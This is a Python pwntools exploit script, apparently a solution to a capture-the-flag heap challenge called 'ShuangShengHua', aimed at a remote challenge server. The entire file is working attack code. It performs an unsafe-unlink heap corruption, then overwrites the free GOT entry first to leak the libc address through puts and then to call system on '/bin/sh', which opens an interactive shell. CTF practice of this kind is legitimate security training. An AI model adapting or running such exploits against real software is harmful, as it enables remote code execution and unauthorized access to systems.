from pwn import *

# context.log_level = 'debug'

# p = process('./ShuangShengHua')
p = remote('challenges.hazmat.buptmerak.cn', 20161)
# p = remote('127.0.0.1', 6999)
attachment = ELF('./ShuangShengHua')
libc = ELF('./libc-2.23.so')

def create(size):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'write?', str(size).encode())

def delete(id):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'delete?', str(id).encode())

def change(id, content):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'change?', str(id).encode())
    p.sendafter(b'begin.', content)

free_got = attachment.got['free']
puts_got = attachment.got['puts']
puts_plt = attachment.plt['puts']
List = 0x6020A0

create(0x80)
create(0x80)
create(0x80)
create(0x80)
payload = p64(0) + p64(0x81) + p64(List + 0x10 - 0x18) + p64(List + 0x10 - 0x10) + p64(0) * 12 + p64(0x80) + p64(0x90)
change(2, payload)
delete(3)

payload = p64(0) + p64(free_got)
change(2, payload)
change(0, p64(puts_plt))
payload = p64(0) + p64(puts_got)
change(2, payload)
delete(0)

p.recvline()
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
print(hex(libc_base))

payload = p64(0) + p64(free_got)
change(2, payload)
change(0, p64(system_addr))
create(0x20)
change(3, b'/bin/sh\x00')
delete(3)

p.interactive()